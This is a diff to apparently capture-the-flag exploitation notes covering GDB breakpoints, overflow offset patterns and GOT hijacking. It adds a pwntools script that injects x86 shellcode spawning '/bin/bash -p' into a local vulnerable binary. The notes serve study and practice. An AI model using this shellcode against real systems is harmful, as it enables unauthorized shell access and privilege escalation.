@@ -51,6 +51,7 @@ After that you can:
       - `break *<pointer>` you can place a breakpoint on a specific pointer of a line of code (**keepInMind:** the pointer has to be specified in the 0x\<something> format to be accepted (i.e. b *0x00000000004008a8 or b *0x4008a8));
 
     **WARNING:** it could happen that GDB says 'Cannot insert breakpoint \<numberOfBreakpoint>' and that it can't access the memory at address \<addressOfBreakpoint>. To solve this problem just use the `delete` command, to remove all the breakpoints, then use the `c` command, to continue the execution of the program to reach its end. Now if you inspect again the `disas main`, or wathever function you were disassembling, the addresses are changed, and you can try re-setting you breakpoints with the new addresses.
+- run `next` after you set a breakpoint to go to the next assembly line of code;
 - run `run` (alternatively just `r`): to run the execution of the code;
 - run `jump <functionName>`: to execute a specific function (ignoring the codeflow);
 - run `disas <functionName>`: to disassemble the function (keep in mind that the disassembler could reverse the operands order in the instructions);
@@ -114,6 +115,21 @@ Commands to use:
 - `pattern_create <numberOfCharForBuffer> <nameOfTheFileWhereThePatternWillBeStored>`: will create a pattern to use with the next command;
   - You can use `run < <nameOfTheFileWhereThePatternIsStored>`, to input the pattern inside of the program (you obviusly have to open it with gdb), and see (if you generated a buffer overflow) the information inside every register, and additional information that coul be useful paired with the next command.
 - `pattern_search`: it uses the pattern created before as an input for a program. The good part is that it will tell you what are the registries where group of chars from the pattern have been spotted (and their distance from the stack pointer)
+
+### Spawning shell using only hex injection
+This requires the code to execute the content of a specific register or memory varible you can manipulate. By doing so you can achieve this:
+```python
+from pwn import *
+
+#the instructions in hex decode, to execute a shell
+shellHex = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+
+p = process("./vuln")
+
+p.sendline(shellHex)
+
+p.interactive()
+```
 
 ## GOT and PLT Hijacking
 In this kind of situation you have to check first with `checksec` if the executable file is writable in the GOT table. We have to check if it's not Full RERLO (in this case the GOT it's writable in some parts), otherwise the GOT it's readonly and then <u>the GOT attack in this case it's not usable</u>.
